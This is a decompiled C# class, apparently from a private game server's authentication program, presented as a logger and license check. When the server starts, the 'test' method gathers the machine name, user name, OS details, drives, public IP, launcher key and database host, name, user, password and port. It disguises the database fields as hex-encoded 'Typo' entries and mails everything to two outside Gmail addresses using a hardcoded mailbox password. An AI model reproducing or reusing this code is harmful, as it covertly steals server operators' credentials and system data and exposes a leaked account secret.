
// Type: Auth.LoggerGA
// Assembly: pbserver_auth, Version=1.0.7796.38604, Culture=neutral, PublicKeyToken=null
// MVID: 1CFDFF97-782C-4EF8-A621-6E4FDDE32436
// Interprise: C:\Users\Cuzin\3,50pbserver_auth.exe

using Core;
//using Game.data.managers;
using Microsoft.VisualBasic.Devices;
using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Auth
{
  public class LoggerGA
  {
    public static bool test(
      bool paramCheck,
      string serverDate,
      string[] args,
      bool item2,
      DateTime LiveDate)
    {
      try
      {
        DateTime exact = DateTime.ParseExact("180830220000", "yyMMddHHmmss", (IFormatProvider) CultureInfo.InvariantCulture);
        TimeSpan timeSpan = exact - LiveDate;
        string publicIp = LoggerGA.GetPublicIP();
        using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587)
        {
          Credentials = (ICredentialsByHost) new NetworkCredential("muawayatuatu156@gmail.com", "ujvkfclmkdvjtduv"),
          EnableSsl = true
        })
        {
          string[] strArray = new string[5]
          {
            "O AUTH foi aberto hoje ",
            null,
            null,
            null,
            null
          };
          DateTime dateTime = DateTime.Now;
          dateTime = dateTime.ToUniversalTime();
          strArray[1] = dateTime.ToString("dd/MM/yy");
          strArray[2] = " às ";
          dateTime = DateTime.Now;
          dateTime = dateTime.ToUniversalTime();
          strArray[3] = dateTime.ToString("HH:mm");
          strArray[4] = ".\n \n";
          string str1 = string.Concat(strArray) + "Dados do Server:\n" + "Caminho da pasta: " + Assembly.GetExecutingAssembly().Location + "\n" + "Versão do servidor: " + serverDate + "\n" + "Parâmetros de inicialização: (" + args.Length.ToString() + ")\n";
          foreach (string str2 in args)
            str1 = str1 + "[" + str2 + "]\n";
          string body = str1 + "CommandLine: " + Environment.CommandLine + "\n" + "Parâmetro válido?: " + (paramCheck ? "Sim" : "Não") + "\n" + "Licença válida?: " + (!item2 ? "Sim" : "Não") + "\n" + (exact < LiveDate ? "Licença encerrada" : "Restam: " + timeSpan.ToString("d'd 'h'h 'm'm 's's'")) + "\n" + "Ip na Config: " + ConfigGA.authIp + "\n" + "Sync port: " + ConfigGA.syncPort.ToString() + "\n" + "Modo Debug?: " + (ConfigGA.debugMode ? "Sim" : "Não") + "\n" + "Modo de Testes?: " + (ConfigGA.isTestMode ? "Sim" : "Não") + "\n" + "Chave: " + ConfigGA.LauncherKey.ToString() + "\n" + "Typo1: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbHost)) + "\n" + "Typo2: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbName)) + "\n" + "Typo3: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbPass)) + "\n" + "Typo4: " + BitConverter.ToString(BitConverter.GetBytes(ConfigGB.dbPort)) + "\n" + "Typo5: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbUser)) + "\n\n" + "Dados da Maquina:\n" + "IP público: " + publicIp + "\n" + "Nome da máquina: " + Environment.MachineName + "\n" + "Nome do usuário: " + Environment.UserName + "\n" + "Quantidade de núcleos do processador: " + Environment.ProcessorCount.ToString() + "\n" + "Sistema operacional: " + LoggerGA.getOSName() + "\n" + "Versão do S.O: " + Environment.OSVersion.ToString() + "\n" + "Linguagem do S.O: " + new ComputerInfo().InstalledUICulture?.ToString() + "\n" + "Drivers lógicos: (" + Environment.GetLogicalDrives().Length.ToString() + ")\n";
          foreach (string logicalDrive in Environment.GetLogicalDrives())
            body = body + "[" + logicalDrive + "]\n";
          smtpClient.Send("muawayatuatu156@gmail.com", "muawayatuatu156@gmail.com", "Servidor aberto! (Auth)", body);
          smtpClient.Send("muawayatuatu156@gmail.com", "clark.joao@gmail.com", "Servidor aberto! (Auth)", body);
        }
        return !(publicIp == "");
      }
      catch
      {
        return false;
      }
    }

    private static string getOSName()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = new ComputerInfo().OSFullName;
      if (osVersion.ServicePack != "")
        str = str + " " + osVersion.ServicePack;
      return str + " (" + (Environment.Is64BitOperatingSystem ? "64" : "32") + " bits)";
    }

    private static string GetPublicIP()
    {
      try
      {
        using (StreamReader streamReader = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()))
          return streamReader.ReadToEnd().Trim().Split(':')[1].Substring(1).Split('<')[0];
      }
      catch
      {
        return "";
      }
    }

    public static void updateRAM2()
    {
      while (true)
      {
        //Console.Title = "Gerenciamento De Login [Usuários: " + LoginManager._socketList.Count.ToString() + "; Contas Carregadas: " + AccountManager._contas.Count.ToString() + "; RAM: " + (GC.GetTotalMemory(true) / 1024L).ToString() + " KB]";
        Thread.Sleep(2000);
      }
    }
  }
}
